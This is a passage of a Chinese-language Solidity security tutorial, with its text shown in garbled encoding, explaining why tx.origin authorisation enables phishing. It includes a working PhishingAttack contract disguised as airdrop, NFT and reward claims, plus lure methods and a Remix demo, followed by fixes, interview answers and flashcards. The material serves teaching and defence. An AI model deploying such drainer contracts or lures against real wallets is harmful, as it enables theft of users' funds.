### åœºæ™¯2ï¼šæ”»å‡»åˆçº¦

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ===== 2. é’“é±¼æ”»å‡»åˆçº¦ =====
contract PhishingAttack {
    VulnerableWallet public targetWallet;
    address public attacker;
    
    event AttackExecuted(address victim, uint256 amount);
    
    constructor(address _wallet) {
        targetWallet = VulnerableWallet(payable(_wallet));
        attacker = msg.sender;
    }
    
    // ä¼ªè£…1ï¼šå‡ç©ºæŠ•
    function claimAirdrop() external {
        // ç”¨æˆ·ä»¥ä¸ºåœ¨é¢†ç©ºæŠ•
        // å®é™…ä¸Šåœ¨å¸®æ”»å‡»è€…ææ¬¾
        _executeAttack();
    }
    
    // ä¼ªè£…2ï¼šå‡ NFT é¢†å–
    function claimFreeNFT() external {
        _executeAttack();
    }
    
    // ä¼ªè£…3ï¼šå‡å¥–åŠ±é¢†å–
    function claimReward() external {
        _executeAttack();
    }
    
    function _executeAttack() internal {
        uint256 balance = targetWallet.getBalance();
        if (balance > 0) {
            targetWallet.withdraw(payable(attacker), balance);
            emit AttackExecuted(tx.origin, balance);
        }
    }
    
    // æ›´éšè”½ï¼šè—åœ¨ receive ä¸­
    receive() external payable {
        if (targetWallet.getBalance() > 0) {
            targetWallet.withdraw(payable(attacker), targetWallet.getBalance());
        }
    }
}
```

### åœºæ™¯3ï¼šæ”»å‡»æ¼”ç¤ºæ­¥éª¤

```solidity
// ===== 3. æ”»å‡»æ¼”ç¤º =====

// æ­¥éª¤1ï¼šå—å®³è€…ï¼ˆownerï¼‰éƒ¨ç½²é’±åŒ…å¹¶å­˜å…¥ 10 ETH
// VulnerableWallet wallet = new VulnerableWallet{value: 10 ether}();

// æ­¥éª¤2ï¼šæ”»å‡»è€…éƒ¨ç½²é’“é±¼åˆçº¦
// PhishingAttack attack = new PhishingAttack(address(wallet));

// æ­¥éª¤3ï¼šæ”»å‡»è€…è¯±éª— owner è°ƒç”¨é’“é±¼åˆçº¦
// æ–¹å¼ï¼š
// - å‘é€"ç©ºæŠ•é¢†å–"é“¾æ¥
// - å‡å†’å®˜æ–¹ç½‘ç«™
// - Discord/Telegram ç§ä¿¡
// - æ¶æ„ NFTï¼ˆæŸ¥çœ‹æ—¶è‡ªåŠ¨è°ƒç”¨ï¼‰

// æ­¥éª¤4ï¼šowner è°ƒç”¨ attack.claimAirdrop()
// æ­¤æ—¶ï¼š
//   tx.origin = ownerï¼ˆå—å®³è€…ï¼‰
//   msg.sender = attackï¼ˆé’“é±¼åˆçº¦ï¼‰
// 
// é’“é±¼åˆçº¦è°ƒç”¨ wallet.withdraw()
//   tx.origin = owner âœ“ï¼ˆéªŒè¯é€šè¿‡ï¼ï¼‰
// 
// é’±è½¬åˆ°æ”»å‡»è€…åœ°å€

// æ­¥éª¤5ï¼šæ”»å‡»è€…è·å¾— 10 ETH
```

### åœºæ™¯4ï¼šä¿®å¤æ–¹æ¡ˆ

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ===== 4. ä¿®å¤åçš„å®‰å…¨é’±åŒ… =====
contract SecureWallet {
    address public owner;
    
    event Withdrawal(address to, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() payable {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");  // âœ… ä½¿ç”¨ msg.sender
        _;
    }
    
    // âœ… å®‰å…¨çš„ææ¬¾å‡½æ•°
    function withdraw(address payable to, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");
        to.transfer(amount);
        emit Withdrawal(to, amount);
    }
    
    // âœ… å®‰å…¨çš„æ‰€æœ‰æƒè½¬ç§»
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
    
    receive() external payable {}
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// æ”»å‡»å°è¯•ï¼š
// owner è¢«è¯±éª—è°ƒç”¨ PhishingAttack.claimAirdrop()
// PhishingAttack è°ƒç”¨ SecureWallet.withdraw()
// æ­¤æ—¶ï¼šmsg.sender = PhishingAttack â‰  owner
// äº¤æ˜“ revertï¼š"Not owner" âœ…
```

### åœºæ™¯5ï¼šä½¿ç”¨ OpenZeppelin

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

// ===== 5. ä½¿ç”¨ OpenZeppelin çš„æœ€ä½³å®è·µ =====
contract BestPracticeWallet is Ownable {
    event Withdrawal(address to, uint256 amount);
    
    constructor() Ownable(msg.sender) payable {}
    
    // âœ… onlyOwner å†…éƒ¨ä½¿ç”¨ msg.sender
    function withdraw(address payable to, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");
        to.transfer(amount);
        emit Withdrawal(to, amount);
    }
    
    receive() external payable {}
}
```

**åœ¨ Remix ä¸­æµ‹è¯•ï¼š**

```
1. ä½¿ç”¨è´¦æˆ·Aï¼ˆownerï¼‰éƒ¨ç½² VulnerableWalletï¼Œå­˜å…¥ 10 ETH
2. ä½¿ç”¨è´¦æˆ·Bï¼ˆattackerï¼‰éƒ¨ç½² PhishingAttack
3. åˆ‡æ¢åˆ°è´¦æˆ·Aï¼Œè°ƒç”¨ PhishingAttack.claimAirdrop()
4. è§‚å¯Ÿï¼šé’±åŒ…ä½™é¢å˜æˆ 0ï¼Œæ”»å‡»è€…è·å¾— 10 ETH

5. éƒ¨ç½² SecureWalletï¼Œå­˜å…¥ 10 ETH
6. éƒ¨ç½²æ–°çš„ PhishingAttackï¼ˆæŒ‡å‘ SecureWalletï¼‰
7. ç”¨è´¦æˆ·Aè°ƒç”¨ claimAirdrop()
8. äº¤æ˜“ revertï¼š"Not owner"
```

---

## 8. ã€é¢è¯•å¿…é—®ã€‘

### é—®é¢˜1ï¼š"tx.origin å’Œ msg.sender æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"

**æ™®é€šå›ç­”ï¼ˆâŒ ä¸å‡ºå½©ï¼‰ï¼š**

"tx.origin æ˜¯äº¤æ˜“å‘èµ·è€…ï¼Œmsg.sender æ˜¯å‡½æ•°è°ƒç”¨è€…ã€‚ä¸åº”è¯¥ç”¨ tx.origin åšæƒé™éªŒè¯ã€‚"

**å‡ºå½©å›ç­”ï¼ˆâœ… æ¨èï¼‰ï¼š**

> **tx.origin å’Œ msg.sender çš„åŒºåˆ«å¯ä»¥ä»ä¸‰ä¸ªå±‚é¢ç†è§£ï¼š**
>
> **1. æŠ€æœ¯å®šä¹‰**ï¼š
> - **tx.origin**ï¼šæ•´æ¡è°ƒç”¨é“¾çš„æœ€åˆå‘èµ·è€…ï¼Œæ°¸è¿œæ˜¯ EOA
> - **msg.sender**ï¼šå½“å‰è°ƒç”¨çš„ç›´æ¥ä¸Šæ¸¸ï¼Œå¯ä»¥æ˜¯ EOA æˆ–åˆçº¦
>
> ```
> User(EOA) â†’ ContractA â†’ ContractB â†’ ContractC
>             â”‚            â”‚            â”‚
>             â”‚            â”‚            â””â”€ msg.sender = B
>             â”‚            â”‚               tx.origin = User
>             â”‚            â””â”€ msg.sender = A
>             â”‚               tx.origin = User
>             â””â”€ msg.sender = User
>                tx.origin = User
> ```
>
> **2. å®‰å…¨é—®é¢˜**ï¼š
> ä½¿ç”¨ tx.origin åšæƒé™éªŒè¯ä¼šå¯¼è‡´é’“é±¼æ”»å‡»ï¼š
> - æ”»å‡»è€…è¯±éª— owner è°ƒç”¨æ¶æ„åˆçº¦
> - æ¶æ„åˆçº¦è°ƒç”¨ç›®æ ‡åˆçº¦çš„æ•æ„Ÿå‡½æ•°
> - tx.origin ä»æ˜¯ ownerï¼ŒéªŒè¯é€šè¿‡
> - æ”»å‡»è€…å€Ÿç”¨äº† owner çš„èº«ä»½
>
> **3. æ­£ç¡®ç”¨æ³•**ï¼š
> - **æƒé™éªŒè¯**ï¼šå¿…é¡»ç”¨ `msg.sender`
> - **è®°å½•æ—¥å¿—**ï¼šå¯ä»¥ç”¨ `tx.origin`ï¼ˆä¸ç”¨äºæƒé™ï¼‰
> - **é˜²æ­¢åˆçº¦è°ƒç”¨**ï¼š`tx.origin == msg.sender` å¯ç”¨ï¼Œä½†ä¼šé˜»æ­¢ AA é’±åŒ…
>
> **å†å²æ•™è®­**ï¼š
> è¿™ä¸ªæ¼æ´è™½ç„¶ç®€å•ï¼Œä½†åœ¨æ—©æœŸå¯¼è‡´äº†å¤šèµ·å®‰å…¨äº‹ä»¶ã€‚ç°åœ¨ Slither ç­‰å·¥å…·ä¼šè‡ªåŠ¨æ£€æµ‹ tx.origin çš„å±é™©ç”¨æ³•ã€‚
>
> **ä»£ç ç¤ºä¾‹**ï¼š
> ```solidity
> // âŒ å±é™©
> require(tx.origin == owner);
> 
> // âœ… å®‰å…¨
> require(msg.sender == owner);
> ```

**ä¸ºä»€ä¹ˆè¿™ä¸ªå›ç­”å‡ºå½©ï¼Ÿ**
1. âœ… ç”¨è°ƒç”¨é“¾å›¾æ¸…æ™°å±•ç¤ºåŒºåˆ«
2. âœ… è§£é‡Šäº†å®‰å…¨é—®é¢˜çš„åŸç†
3. âœ… ç»™å‡ºäº†æ­£ç¡®ç”¨æ³•çš„åœºæ™¯åˆ’åˆ†
4. âœ… æœ‰ä»£ç ç¤ºä¾‹

---

### é—®é¢˜2ï¼š"å¦‚ä½•é˜²æ­¢åˆçº¦è°ƒç”¨æˆ‘çš„å‡½æ•°ï¼Ÿ"

**æ™®é€šå›ç­”ï¼ˆâŒ ä¸å‡ºå½©ï¼‰ï¼š**

"æ£€æŸ¥ tx.origin == msg.sender å°±å¯ä»¥äº†ã€‚"

**å‡ºå½©å›ç­”ï¼ˆâœ… æ¨èï¼‰ï¼š**

> **é˜²æ­¢åˆçº¦è°ƒç”¨æœ‰å¤šç§æ–¹å¼ï¼Œéœ€è¦æ ¹æ®åœºæ™¯é€‰æ‹©ï¼š**
>
> **æ–¹å¼1ï¼štx.origin == msg.senderï¼ˆç®€å•ä½†æœ‰ä»£ä»·ï¼‰**
> ```solidity
> modifier noContract() {
>     require(tx.origin == msg.sender, "No contracts");
>     _;
> }
> ```
> - ä¼˜ç‚¹ï¼šç®€å•æœ‰æ•ˆ
> - ç¼ºç‚¹ï¼šé˜»æ­¢äº†æ™ºèƒ½åˆçº¦é’±åŒ…ï¼ˆSafeã€Argentï¼‰å’Œ EIP-4337 è´¦æˆ·æŠ½è±¡
> - é€‚ç”¨ï¼šç¡®å®šä¸éœ€è¦æ”¯æŒåˆçº¦é’±åŒ…çš„åœºæ™¯
>
> **æ–¹å¼2ï¼šæ£€æŸ¥ä»£ç å¤§å°ï¼ˆå¯è¢«ç»•è¿‡ï¼‰**
> ```solidity
> modifier noContract() {
>     require(msg.sender.code.length == 0, "No contracts");
>     _;
> }
> ```
> - é—®é¢˜ï¼šåˆçº¦åœ¨æ„é€ å‡½æ•°æ‰§è¡Œæ—¶ code.length == 0
> - å¯è¢«ç»•è¿‡ï¼Œä¸æ¨èå•ç‹¬ä½¿ç”¨
>
> **æ–¹å¼3ï¼šç­¾åéªŒè¯ï¼ˆæ¨èç”¨äºé˜²æœºå™¨äººï¼‰**
> ```solidity
> function mint(bytes calldata signature) external {
>     bytes32 hash = keccak256(abi.encode(msg.sender, block.chainid));
>     require(verifySignature(hash, signature, signer), "Invalid");
>     // ...
> }
> ```
> - åç«¯å‘æ”¾ç­¾åï¼Œé˜²æ­¢è‡ªåŠ¨åŒ–è°ƒç”¨
> - æ”¯æŒåˆçº¦é’±åŒ…
>
> **æ–¹å¼4ï¼šæ‰¿è¯º-æ­ç¤ºæ–¹æ¡ˆï¼ˆé˜²æ­¢æŠ¢è·‘ï¼‰**
> ```solidity
> mapping(bytes32 => bool) public commits;
> 
> function commit(bytes32 hash) external {
>     commits[hash] = true;
> }
> 
> function reveal(uint256 secret) external {
>     require(commits[keccak256(abi.encode(msg.sender, secret))]);
>     // ...
> }
> ```
>
> **æˆ‘çš„å»ºè®®**ï¼š
> 1. å¦‚æœæ˜¯é˜²æœºå™¨äºº â†’ ç”¨ç­¾åéªŒè¯
> 2. å¦‚æœæ˜¯é˜²æŠ¢è·‘ â†’ ç”¨æ‰¿è¯º-æ­ç¤º
> 3. å¦‚æœçœŸçš„éœ€è¦é˜»æ­¢åˆçº¦ â†’ ç”¨ tx.origin == msg.senderï¼Œä½†è¦åœ¨æ–‡æ¡£ä¸­æ˜ç¡®è¯´æ˜

**ä¸ºä»€ä¹ˆè¿™ä¸ªå›ç­”å‡ºå½©ï¼Ÿ**
1. âœ… ç»™å‡ºäº†å¤šç§æ–¹æ¡ˆå¯¹æ¯”
2. âœ… åˆ†æäº†æ¯ç§æ–¹æ¡ˆçš„ä¼˜ç¼ºç‚¹
3. âœ… è€ƒè™‘äº† AA é’±åŒ…ç­‰æ–°å…´åœºæ™¯
4. âœ… ç»™å‡ºäº†åœºæ™¯åŒ–çš„å»ºè®®

---

## 9. ã€åŒ–éª¨ç»µæŒã€‘

### å¡ç‰‡1ï¼štx.origin æ˜¯ä»€ä¹ˆï¼Ÿ ğŸ“

**ä¸€å¥è¯ï¼š** tx.origin æ˜¯æ•´æ¡è°ƒç”¨é“¾çš„æœ€åˆå‘èµ·è€…ï¼Œæ°¸è¿œæ˜¯ EOAï¼ˆå¤–éƒ¨è´¦æˆ·ï¼‰ã€‚

**ä¸¾ä¾‹ï¼š**
```
User(EOA) â†’ ContractA â†’ ContractB
åœ¨ ContractB ä¸­ï¼š
  tx.origin = Userï¼ˆä¸å˜ï¼‰
  msg.sender = ContractAï¼ˆå˜åŒ–ï¼‰
```

**åº”ç”¨ï¼š** tx.origin å¯ç”¨äºæ—¥å¿—è®°å½•ï¼Œä½†ä¸èƒ½ç”¨äºæƒé™éªŒè¯ã€‚

---

### å¡ç‰‡2ï¼šmsg.sender æ˜¯ä»€ä¹ˆï¼Ÿ ğŸ“

**ä¸€å¥è¯ï¼š** msg.sender æ˜¯ç›´æ¥è°ƒç”¨è€…çš„åœ°å€ï¼Œå¯ä»¥æ˜¯ EOA æˆ–åˆçº¦ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
// ç›´æ¥è°ƒç”¨ï¼šmsg.sender = ç”¨æˆ·
// é—´æ¥è°ƒç”¨ï¼šmsg.sender = ä¸Šä¸€å±‚åˆçº¦
function whoCalledMe() external view returns (address) {
    return msg.sender;  // ç›´æ¥è°ƒç”¨è€…
}
```

**åº”ç”¨ï¼š** æƒé™éªŒè¯å¿…é¡»ä½¿ç”¨ msg.senderã€‚

---

### å¡ç‰‡3ï¼šé’“é±¼æ”»å‡»åŸç† ğŸ£

**ä¸€å¥è¯ï¼š** æ”»å‡»è€…è¯±éª—ç”¨æˆ·è°ƒç”¨æ¶æ„åˆçº¦ï¼Œæ¶æ„åˆçº¦å€Ÿç”¨ç”¨æˆ·çš„ tx.originã€‚

**ä¸¾ä¾‹ï¼š**
```
1. æ”»å‡»è€…ï¼š"é¢†å–å…è´¹ç©ºæŠ•ï¼"
2. å—å®³è€…è°ƒç”¨æ¶æ„åˆçº¦
3. æ¶æ„åˆçº¦è°ƒç”¨ç›®æ ‡åˆçº¦
4. tx.origin = å—å®³è€… â†’ éªŒè¯é€šè¿‡
5. æ”»å‡»æˆåŠŸ
```

**åº”ç”¨ï¼š** è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ç”¨ tx.origin åšæƒé™éªŒè¯ã€‚

---

### å¡ç‰‡4ï¼šæ¼æ´ä»£ç è¯†åˆ« ğŸ”

**ä¸€å¥è¯ï¼š** åœ¨æƒé™æ£€æŸ¥ä¸­çœ‹åˆ° tx.origin å°±æ˜¯å±é™©ä¿¡å·ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
// âŒ å±é™©ä»£ç 
require(tx.origin == owner);
if (tx.origin == admin) { ... }

// âœ… å®‰å…¨ä»£ç 
require(msg.sender == owner);
if (msg.sender == admin) { ... }
```

**åº”ç”¨ï¼š** ä»£ç å®¡è®¡æ—¶æœç´¢ "tx.origin"ï¼Œæ£€æŸ¥æ‰€æœ‰ä½¿ç”¨åœºæ™¯ã€‚

---

### å¡ç‰‡5ï¼šæ­£ç¡®çš„æƒé™éªŒè¯ âœ…

**ä¸€å¥è¯ï¼š** ä½¿ç”¨ msg.sender éªŒè¯ï¼Œæˆ–ä½¿ç”¨ OpenZeppelin çš„ Ownable/AccessControlã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
import "@openzeppelin/contracts/access/Ownable.sol";

contract Safe is Ownable {
    function admin() external onlyOwner {
        // onlyOwner å†…éƒ¨ä½¿ç”¨ msg.sender
    }
}
```

**åº”ç”¨ï¼š** æ‰€æœ‰æ–°é¡¹ç›®éƒ½åº”ä½¿ç”¨ OpenZeppelin çš„æˆç†Ÿå®ç°ã€‚

---

### å¡ç‰‡6ï¼štx.origin == msg.sender çš„é™·é˜± âš ï¸

**ä¸€å¥è¯ï¼š** è¿™ä¸ªæ£€æŸ¥å¯ä»¥é˜»æ­¢åˆçº¦è°ƒç”¨ï¼Œä½†ä¼šé˜»æ­¢æ™ºèƒ½åˆçº¦é’±åŒ…ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
// é˜»æ­¢åˆçº¦è°ƒç”¨
require(tx.origin == msg.sender, "No contracts");

// é—®é¢˜ï¼šSafeã€Argent ç­‰æ™ºèƒ½é’±åŒ…æ— æ³•ä½¿ç”¨
// EIP-4337 è´¦æˆ·æŠ½è±¡ä¹Ÿæ— æ³•ä½¿ç”¨
```

**åº”ç”¨ï¼š** é™¤éç¡®å®šä¸éœ€è¦æ”¯æŒåˆçº¦é’±åŒ…ï¼Œå¦åˆ™é¿å…è¿™ç§æ£€æŸ¥ã€‚

---

### å¡ç‰‡7ï¼štx.origin çš„åˆç†ç”¨é€” âœ…

**ä¸€å¥è¯ï¼š** tx.origin å¯ç”¨äºæ—¥å¿—è®°å½•å’Œ Gas è¿½è¸ªï¼Œä¸èƒ½ç”¨äºæƒé™éªŒè¯ã€‚

**ä¸¾ä¾‹ï¼š**
```solidity
// âœ… è®°å½•è°å‘èµ·äº†äº¤æ˜“
event TxInitiated(address origin);
emit TxInitiated(tx.origin);

// âœ… Gas è¡¥è´´è¿½è¸ª
gasSpent[tx.origin] += gasUsed;
```

**åº”ç”¨ï¼š** è¿™äº›ç”¨é€”ä¸æ¶‰åŠæƒé™ï¼Œå› æ­¤æ˜¯å®‰å…¨çš„ã€‚

---

### å¡ç‰‡8ï¼šç±»ä¼¼æ”»å‡»ï¼šCSRF ğŸŒ

**ä¸€å¥è¯ï¼š** é’“é±¼æ”»å‡»ç±»ä¼¼äº Web å¼€å‘ä¸­çš„ CSRF æ”»å‡»ã€‚

**ä¸¾ä¾‹ï¼š**
```
é’“é±¼æ”»å‡»             CSRF æ”»å‡»
â”€â”€â”€â”€â”€â”€â”€â”€â”€           â”€â”€â”€â”€â”€â”€â”€â”€â”€
å€Ÿç”¨ tx.origin       å€Ÿç”¨ Cookie
æ¶æ„åˆçº¦ä¸­é—´äºº       æ¶æ„ç½‘ç«™ä¸­é—´äºº
é˜²å¾¡ï¼šmsg.sender     é˜²å¾¡ï¼šCSRF Token
```

**åº”ç”¨ï¼š** å‰ç«¯å·¥ç¨‹å¸ˆå¯ä»¥ç”¨ CSRF çš„æ€ç»´ç†è§£è¿™ä¸ªæ¼æ´ã€‚

---

### å¡ç‰‡9ï¼šå·¥å…·æ£€æµ‹ ğŸ› ï¸

**ä¸€å¥è¯ï¼š** Slither ç­‰å·¥å…·å¯ä»¥è‡ªåŠ¨æ£€æµ‹ tx.origin çš„å±é™©ç”¨æ³•ã€‚

**ä¸¾ä¾‹ï¼š**
```bash
# å®‰è£… Slither
pip install slither-analyzer

# è¿è¡Œæ£€æµ‹
slither . --detect tx-origin
```

**åº”ç”¨ï¼š** åœ¨ CI/CD ä¸­é›†æˆ Slitherï¼Œè‡ªåŠ¨æ£€æµ‹å®‰å…¨é—®é¢˜ã€‚

---

### å¡ç‰‡10ï¼šæœ€ä½³å®è·µæ€»ç»“ ğŸ“‹

**ä¸€å¥è¯ï¼š** æƒé™éªŒè¯ç”¨ msg.senderï¼Œæ—¥å¿—è¿½è¸ªç”¨ tx.originã€‚

**æ ¸å¿ƒå®è·µï¼š**
```solidity
// âœ… æƒé™éªŒè¯
require(msg.sender == owner);

// âœ… ä½¿ç”¨ OpenZeppelin
import "@openzeppelin/contracts/access/Ownable.sol";

// âœ… æ—¥å¿—è®°å½•ï¼ˆéæƒé™ç”¨é€”ï¼‰
emit TxOrigin(tx.origin);

// âš ï¸ è°¨æ…ä½¿ç”¨
require(tx.origin == msg.sender);  // ä¼šé˜»æ­¢ AA é’±åŒ…
```

**å»¶ä¼¸å­¦ä¹ ï¼š**
- [SWC-115: Authorization through tx.origin](https://swcregistry.io/docs/SWC-115)
- [Solidity by Example - tx.origin Phishing](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)

---

## 10. ã€ä¸€å¥è¯æ€»ç»“ã€‘

**tx.origin æ˜¯äº¤æ˜“æœ€åˆå‘èµ·è€…åœ°å€ï¼Œmsg.sender æ˜¯ç›´æ¥è°ƒç”¨è€…åœ°å€ï¼Œä½¿ç”¨ tx.origin åšæƒé™éªŒè¯ä¼šå¯¼è‡´é’“é±¼æ”»å‡»ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥è¯±éª—ç”¨æˆ·è°ƒç”¨æ¶æ„åˆçº¦æ¥å€Ÿç”¨ç”¨æˆ·çš„ tx.origin èº«ä»½ï¼Œæ­£ç¡®åšæ³•æ˜¯å§‹ç»ˆä½¿ç”¨ msg.sender éªŒè¯æƒé™ã€‚**

---

## ğŸ“š é™„å½•

### å­¦ä¹ æ£€æŸ¥æ¸…å•

å®Œæˆæœ¬çŸ¥è¯†ç‚¹å­¦ä¹ åï¼Œä½ åº”è¯¥èƒ½å¤Ÿï¼š

- [ ] è§£é‡Š tx.origin å’Œ msg.sender çš„åŒºåˆ«
- [ ] ç»˜åˆ¶è°ƒç”¨é“¾ä¸­ä¸¤è€…çš„å˜åŒ–
- [ ] ç†è§£é’“é±¼æ”»å‡»çš„åŸç†
- [ ] è¯†åˆ«ä»£ç ä¸­çš„ tx.origin æ¼æ´
- [ ] æ­£ç¡®ä½¿ç”¨ msg.sender åšæƒé™éªŒè¯
- [ ] äº†è§£ tx.origin çš„åˆç†ä½¿ç”¨åœºæ™¯
- [ ] ç†è§£ AA é’±åŒ…å…¼å®¹æ€§é—®é¢˜

### å¿«é€Ÿå‚è€ƒå¡

**åŒºåˆ«å¯¹æ¯”ï¼š**
```
tx.origin  = äº¤æ˜“å‘èµ·è€…ï¼ˆæ°¸è¿œæ˜¯ EOAï¼‰
msg.sender = ç›´æ¥è°ƒç”¨è€…ï¼ˆEOA æˆ–åˆçº¦ï¼‰
```

**å±é™©ä»£ç ï¼š**
```solidity
// âŒ æ°¸è¿œä¸è¦è¿™æ ·åš
require(tx.origin == owner);
```

**å®‰å…¨ä»£ç ï¼š**
```solidity
// âœ… ä½¿ç”¨ msg.sender
require(msg.sender == owner);

// âœ… ä½¿ç”¨ OpenZeppelin
onlyOwner modifier
```

### å‚è€ƒèµ„æº

- [SWC-115: Authorization through tx.origin](https://swcregistry.io/docs/SWC-115)
- [Solidity Docs - tx.origin](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
- [Solidity by Example - Phishing](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)

---

**ç‰ˆæœ¬ï¼š** v1.0
**åˆ›å»ºæ—¥æœŸï¼š** 2025-12-08
**é€‚ç”¨äººç¾¤ï¼š** å‰ç«¯å·¥ç¨‹å¸ˆè½¬Web3å¼€å‘

---

**è®°ä½ï¼š** tx.origin å‘Šè¯‰ä½ "è°å‘èµ·äº†äº¤æ˜“"ï¼Œmsg.sender å‘Šè¯‰ä½ "è°åœ¨è°ƒç”¨æˆ‘"â€”â€”æƒé™éªŒè¯åº”è¯¥éªŒè¯"è°åœ¨è°ƒç”¨æˆ‘"ï¼ğŸ¯
